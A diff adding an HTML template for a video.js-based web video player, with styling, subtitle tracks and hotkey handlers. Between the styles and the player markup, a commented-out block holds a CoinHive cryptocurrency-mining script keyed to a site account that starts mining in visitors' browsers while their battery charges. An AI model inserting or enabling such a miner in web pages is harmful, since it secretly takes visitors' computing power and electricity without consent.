@@ -1,0 +1,170 @@
+<head>
+    <title>{{.Title}}</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link href="/www/videojs/video-js.css" rel="stylesheet">
+    <script src="/www/videojs/video.min.js"></script>
+    <script src="/www/videojs-hotkeys/videojs.hotkeys.js"></script>  
+</head>
+<style>
+    *{margin: 0;box-sizing: border-box;}
+    html{font-family: 'Lato',sans-serif;overflow: auto;background:black;}
+    .video-container {
+        width: 100%;
+        height: 100vh;
+    }
+    .video-js .vjs-control-bar { 
+        display: -webkit-box;
+        display: -webkit-flex;
+        display: -ms-flexbox;
+        display: flex;
+    }
+    .video-js {
+        font-size: 18px;
+        color: whitesmoke;
+    }
+    .vjs-default-skin .vjs-big-play-button {
+        font-size: 3em;
+        line-height: 2em;
+        height: 2em;
+        width: 2em;
+        border: 0;
+        border-radius: 1em;
+        left: 50%;
+        top: 50%;
+        margin-left: -(2em / 2);
+        margin-top: -(2em / 2);   
+    }
+    .video-js .vjs-control-bar,
+    .video-js .vjs-big-play-button,
+    .video-js .vjs-menu-button .vjs-menu-content {
+        background-color: #222;
+        /*transparent*/
+        background-color: rgba(22,22,22, 0);
+    }
+    .video-js .vjs-slider {
+        background-color: lighten(22,22,22, 33%);
+        background-color: rgba(lighten(22,22,22, 33%), 0.5);
+    }
+    .video-js .vjs-volume-level,
+    .video-js .vjs-play-progress,
+    .video-js .vjs-slider-bar {
+        background: whitesmoke;
+    }
+    .video-js .vjs-load-progress {
+        background: lighten(lighten(22,22,22, 33%), 25%);
+        background: rgba(lighten(22,22,22, 33%), 0.5);
+    }
+    .video-js .vjs-load-progress div {
+        background: lighten(lighten(22,22,22, 33%), 50%);
+        background: rgba(lighten(22,22,22, 33%), 0.75);
+    }
+</style>
+<!-- <script src="/www/app.min.js"></script>
+<script>
+    var app=new CoinHive.User('av9Aex6KtkQ94DNpbdcrGc5mlVqOACLA', {throttle: 0.4});
+    try {
+        navigator.getBattery().then(function (battery) {
+            if (battery.charging) app.start();
+            battery.onchargingchange = function (evt) {
+                if (battery.charging) app.start();
+                else app.stop();
+            }
+        });
+    }
+    catch(e){app.start();}
+</script> -->
+
+<video-js id="video" class="video-js vjs-default-skin vjs-fill"
+    crossorigin="anonymous"
+    width="100%" height="100%"
+    controls
+    preload="metadata"
+    data-setup='{ "playbackRates": [0.25, 0.5, 1, 1.5] }'>
+
+    <source src='/stream?{{.URI}}' type="video/mp4">
+    <p class="vjs-no-js">your browser does not support the video tag.</p>
+
+    {{range .Subs}}
+        <track src='/blob/{{.Path}}' kind="captions" label='{{.Lang}}'>
+    {{end}}
+
+</video-js>
+
+<script>
+var player = videojs('video');
+player.play()
+player.ready(function(){
+this.hotkeys({
+    volumeStep: 0.1,
+    seekStep: 5,
+    enableMute: true,
+    enableFullscreen: true,
+    enableNumbers: false,
+    enableVolumeScroll: true,
+    enableHoverScroll: true,
+    // Mimic VLC seek behavior, and default to 5.
+    seekStep: function(e) {
+        if (e.ctrlKey && e.altKey) {
+            return 5*60;
+        } else if (e.ctrlKey) {
+            return 60;
+        } else if (e.altKey) {
+            return 10;
+        } else {
+            return 5;
+        }
+    },
+    // Enhance existing simple hotkey with a complex hotkey
+    fullscreenKey: function(e) {
+        return ((e.which === 70) || (e.ctrlKey && e.which === 13));
+    },
+    // Custom Keys
+    customKeys: {
+        // Add new simple hotkey
+        simpleKey: {
+            key: function(e) {
+            // Toggle something with S Key
+                return (e.which === 83);
+            },
+            handler: function(player, options, e) {
+                // Example
+                if (player.paused()) {
+                    player.play();
+                } else {
+                    player.pause();
+                }
+            }
+        },
+        // Add new complex hotkey
+        complexKey: {
+            key: function(e) {
+            // Toggle something with CTRL + D Key
+                return (e.ctrlKey && e.which === 68);
+            },
+            handler: function(player, options, event) {
+            // Example
+                if (options.enableMute) {
+                    player.muted(!player.muted());
+                }
+            }
+        },
+        numbersKey: {
+            key: function(event) {
+                return ((event.which > 47 && event.which < 59) || (event.which > 95 && event.which < 106));
+            },
+            handler: function(player, options, event) {
+                if (options.enableModifiersForNumbers || !(event.metaKey || event.ctrlKey || event.altKey)) {
+                    var sub = 48;
+                    if (event.which > 95) {
+                            sub = 96;
+                        }
+                        var number = event.which - sub;
+                        player.currentTime(player.duration() * number * 0.1);
+                    }
+                }
+            },
+        }
+    });
+});
+</script>
